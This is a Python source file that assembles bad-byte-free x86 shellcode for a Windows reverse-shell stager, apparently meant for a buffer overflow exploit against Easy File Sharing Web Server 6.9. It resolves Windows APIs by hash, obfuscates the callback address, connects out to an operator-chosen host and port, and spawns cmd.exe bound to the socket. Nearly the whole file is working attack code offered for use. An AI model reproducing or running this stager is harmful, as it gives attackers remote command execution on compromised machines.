"""Callback reverse-shell stager for the EFS 6.9 BOF."""
from __future__ import annotations

import struct
from ipaddress import ip_address
from typing import Tuple

import keystone

BAD_BYTES = frozenset(b"\x00\x0a\x0d\xff\x20\x3b")

D_LOADLIBRARY  = 0
D_WSASTARTUP   = 13
D_WSASOCKETA   = 24
D_CONNECT      = 36
D_SETHANDLE    = 44
D_CREATEPROCA  = 66
D_EXITPROCESS  = 80
D_WS2_32       = 92
D_CMD          = 100
D_SOCKADDR     = 104
DATA_SIZE      = 120

H_LL = 0xEC0E4E8E
H_WS = 0x3BFCEDCB
H_WK = 0xADF509D9
H_CN = 0x60AAF9EC
H_SH = 0x7F9E1144
H_CP = 0x16B3FE72
H_EP = 0x73E2D87E

_SOCKADDR_XOR_KEY = 0x41

_WT = """
    mov    edx, [ebx + 0x3C]
    add    edx, ebx
    mov    edx, [edx + 0x78]
    add    edx, ebx
    lea    esi, [edx + 0x08]
    add    esi, 0x18
    mov    esi, [esi]
    add    esi, ebx
    xor    ecx, ecx
_L{s}f:
    inc    ecx
    lodsd
    add    eax, ebx
    push   esi
    push   edx
    mov    esi, eax
    xor    eax, eax
    xchg   eax, edi
_L{s}h:
    xor    eax, eax
    lodsb
    test   al, al
    jz     _L{s}d
    ror    edi, 12
    ror    edi, 1
    add    edi, eax
    jmp    _L{s}h
_L{s}d:
    pop    edx
    pop    esi
{h_load}
    cmp    edi, ecx
    jne    _L{s}f
    dec    ecx
    mov    edi, [edx + 0x24]
    add    edi, ebx
    movzx  eax, word ptr [edi + ecx*2]
    mov    edi, [edx + 0x1C]
    add    edi, ebx
    mov    eax, [edi + eax*4]
    add    eax, ebx
"""

def _load_hash_imm(h: int) -> str:
    """Load a ROR13 hash into ECX without cookie-forbidden bytes in the encoding."""
    h &= 0xFFFFFFFF
    imm_le = struct.pack("<I", h)
    if not any(b in BAD_BYTES for b in imm_le):
        return f"    mov    ecx, 0x{h:08X}"

    for base in range(0x01010101, 0x100000000, 0x01010101):
        if any(b in BAD_BYTES for b in struct.pack("<I", base)):
            continue
        delta = (h - base) & 0xFFFFFFFF
        if any(b in BAD_BYTES for b in struct.pack("<I", delta)):
            continue
        return (
            f"    mov    ecx, 0x{base:08X}\n"
            f"    add    ecx, 0x{delta:08X}"
        )

    for key in range(1, 0x100000000):
        if key & 0xFF in BAD_BYTES:
            continue
        enc = h ^ key
        if any(b in BAD_BYTES for b in struct.pack("<I", enc)):
            continue
        if any(b in BAD_BYTES for b in struct.pack("<I", key)):
            continue
        return (
            f"    mov    ecx, 0x{enc:08X}\n"
            f"    xor    ecx, 0x{key:08X}"
        )

    raise ValueError(f"cannot encode hash 0x{h:08X} without cookie bad bytes")


def W(h, s):
    return _WT.format(h_load=_load_hash_imm(h), s=s)

_W1 = W(H_LL, "ll")
_W2 = W(H_WS, "ws")
_W3 = W(H_WK, "wk")
_W4 = W(H_CN, "cn")
_W5 = W(H_SH, "sh")
_W6 = W(H_CP, "cp")
_W7 = W(H_EP, "ep")

def _CALL(slot, sfx, cleanup="", disp=14):
    return f"""
    mov    eax, [edi + {slot}]
_B{sfx}:
    fldz
    fnstenv [esp - 0x0C]
    pop    ebp
    add    ebp, {disp}
    push   ebp
    push   eax
    ret
_A{sfx}:
{cleanup}
"""

_ASM = f"""
    cld
    xor    edx, edx
    mov    eax, fs:[edx + 0x30]
    mov    eax, [eax + 0x0C]
    mov    esi, [eax + 0x14]
    lodsd
    xchg   eax, esi
    lodsd
    mov    ebx, [eax + 0x10]

    sub    esp, 40
    mov    edi, esp
    mov    [edi + 28], ebx

_B0:
    fldz
    fnstenv [esp - 0x0C]
    pop    ebp
    xor    ebx, ebx
    mov    bx, 0xDEAD
    add    ebx, ebp

    push   edi
{_W1}
    pop    edi
    mov    [edi + 0], eax

    lea    eax, [ebx + {D_WS2_32}]
    mov    cl, 0x90
    xor    [eax + 7], cl
    push   eax
_Bll:
    fldz
    fnstenv [esp - 0x0C]
    pop    ebp
    add    ebp, 14
    push   ebp
    push   eax
    ret
_All:
    lea    ecx, [edi + 0x1F]
    mov    [ecx + 1], eax

    lea    ecx, [edi + 0x1F]
    mov    ebx, [ecx + 1]
    push   edi
{_W2}
    pop    edi
    mov    [edi + 4], eax

    push   edi
{_W3}
    pop    edi
    mov    [edi + 8], eax

    push   edi
{_W4}
    pop    edi
    mov    [edi + 12], eax

    mov    ebx, [edi + 28]
    push   edi
{_W5}
    pop    edi
    mov    [edi + 16], eax

    push   edi
{_W6}
    pop    edi
    mov    [edi + 20], eax

    push   edi
{_W7}
    pop    edi
    mov    [edi + 24], eax

    sub    sp, 400
    push   esp
    xor    eax, eax
    mov    ah, 2
    mov    al, 2
    push   eax
{_CALL(4, "wsa", "    add sp, 408")}

    xor    eax, eax
    push   eax
    push   eax
    push   eax
    push   eax
    inc    eax
    push   eax
    inc    eax
    push   eax
{_CALL(8, "wk")}
    mov    [edi + 36], eax

    xor    eax, eax
    inc    eax
    push   eax
    push   eax
    mov    eax, [edi + 36]
    push   eax
{_CALL(16, "sh")}

    lea    eax, [ebx + {D_SOCKADDR}]
    mov    cl, 0x01
    xor    [eax + 1], cl
    mov    cl, {_SOCKADDR_XOR_KEY}
    xor    [eax + 2], cl
    xor    [eax + 3], cl
    xor    [eax + 4], cl
    xor    [eax + 5], cl
    xor    [eax + 6], cl
    xor    [eax + 7], cl
    push   16
    push   eax
    mov    eax, [edi + 36]
    push   eax
{_CALL(12, "co")}

    xor    eax, eax
    push   eax
    push   eax
    push   eax
    push   eax

    sub    esp, 68
    xor    eax, eax
    mov    al, 0x44
    mov    [esp], al
    xor    eax, eax
    inc    eax
    xchg   ah, al
    mov    [esp + 42], eax
    mov    eax, [edi + 36]
    lea    ecx, [esp + 54]
    mov    [ecx], eax
    mov    [ecx + 4], eax
    mov    [ecx + 8], eax

    lea    eax, [esp + 68]
    push   eax
    lea    eax, [esp + 4]
    push   eax
    xor    eax, eax
    push   eax
    push   eax
    push   eax
    inc    eax
    push   eax
    xor    eax, eax
    push   eax
    push   eax
    lea    eax, [ebx + {D_CMD}]
    mov    cl, 0x90
    xor    [eax + 3], cl
    push   eax
    xor    eax, eax
    push   eax
{_CALL(20, "cp")}

    xor    eax, eax
    push   eax
    mov    eax, [edi + 24]
    push   eax
    ret
"""


def _assemble() -> bytes:
    clean = "\n".join(
        l for l in _ASM.split("\n")
        if l.strip() and not l.strip().startswith(";")
    )
    ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    enc, _cnt = ks.asm(clean.encode())
    if enc is None:
        raise RuntimeError("keystone assembly failed")
    return bytes(enc)


def _patch(instructions: bytes) -> bytes:
    sentinel = b"\x66\xBB\xAD\xDE"
    idx = instructions.find(sentinel)
    if idx == -1 or instructions.count(sentinel) != 1:
        raise RuntimeError("mov bx sentinel not found or not unique")

    pattern = b"\xD9\x74\x24\xF4\x5D\x31\xDB\x66\xBB"
    match_start = instructions.find(pattern)
    if match_start == -1:
        raise RuntimeError("entry fldz→fnstenv→xor sequence not found")
    fldz_idx = match_start - 2  # D9 EE (fldz) is 2 bytes before fnstenv

    base_off = fldz_idx
    disp = len(instructions) - base_off
    patched = bytearray(instructions)
    struct.pack_into("<H", patched, idx + 2, disp & 0xFFFF)
    return bytes(patched)


def _build_data() -> bytes:
    return b"".join([
        b"LoadLibraryA\x90",
        b"WSAStartup\x90",
        b"WSASocketA\x90",
        b"connect\x90",
        b"SetHandleInformation\x90",
        b"CreateProcessA\x90",
        b"ExitProcess\x90",
        b"ws2_32\x90",
        b"cmd\x90",
        b"\x02\x01",              # sin_family = 0x0002, xor byte[+1],0x01 at runtime
        b"\x41\x42",              # sin_port placeholder
        b"\x41\x42\x43\x44",     # sin_addr placeholder
        b"\x90\x90\x90\x90",
        b"\x90\x90\x90\x90",
    ])


_CACHED = None


def _stub() -> bytes:
    global _CACHED
    if _CACHED is None:
        raw = _assemble()
        raw = _patch(raw)
        _CACHED = raw + _build_data()
    return _CACHED


def build_callback_bytes(lhost: str, lport: int) -> bytes:
    data = _stub()
    code_sz = len(data) - DATA_SIZE
    sock_addr = code_sz + D_SOCKADDR
    key = _SOCKADDR_XOR_KEY
    lhost_raw = ip_address(lhost).packed
    lport_raw = struct.pack("!H", lport)
    data = bytearray(data)
    data[sock_addr + 2:sock_addr + 4] = bytes(b ^ key for b in lport_raw)
    data[sock_addr + 4:sock_addr + 8] = bytes(b ^ key for b in lhost_raw)
    data = bytes(data)

    illegal = [(i, b) for i, b in enumerate(data) if b in BAD_BYTES]
    if illegal:
        off, b = illegal[0]
        raise ValueError(
            f"callback stager has bad byte 0x{b:02x} at offset {off} "
            f"after lhost/lport patching (try a different --lhost/--lport)"
        )
    return data


def parse_lhost_lport(data: bytes) -> Tuple[str, int]:
    code_sz = len(data) - DATA_SIZE
    sock_addr = code_sz + D_SOCKADDR
    key = _SOCKADDR_XOR_KEY
    lport_raw = bytes(b ^ key for b in data[sock_addr + 2:sock_addr + 4])
    lhost_raw = bytes(b ^ key for b in data[sock_addr + 4:sock_addr + 8])
    port = struct.unpack("!H", lport_raw)[0]
    host = str(ip_address(lhost_raw))
    return host, port


if __name__ == "__main__":
    s = build_callback_bytes("1.2.3.4", 4444)
    print(f"size: {len(s)} bytes")
    h, p = parse_lhost_lport(s)
    print(f"round-trip: {h}:{p}")
    bad = [f"0x{b:02x}@{i}" for i, b in enumerate(s) if b in BAD_BYTES]
    if bad:
        print(f"BAD: {', '.join(bad)}")
    else:
        print("no bad bytes")
